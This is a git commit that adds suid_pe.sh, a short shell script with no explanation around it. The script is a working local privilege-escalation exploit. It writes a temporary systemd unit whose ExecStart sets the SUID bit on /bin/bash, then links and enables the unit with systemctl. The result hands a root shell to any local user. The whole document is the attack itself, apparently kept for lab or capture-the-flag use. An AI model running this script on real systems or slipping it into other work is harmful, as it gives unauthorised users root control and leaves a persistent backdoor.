3fef2c1b32d1b1b732dc0740b2ecc18eafb57df6
touri-n <84957287+touri-n@users.noreply.github.com>
2025-06-22 09:19:47 +0900

    Create suid_pe.sh

---
+++ suid_pe.sh
@@ -0,0 +1,9 @@
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+                            
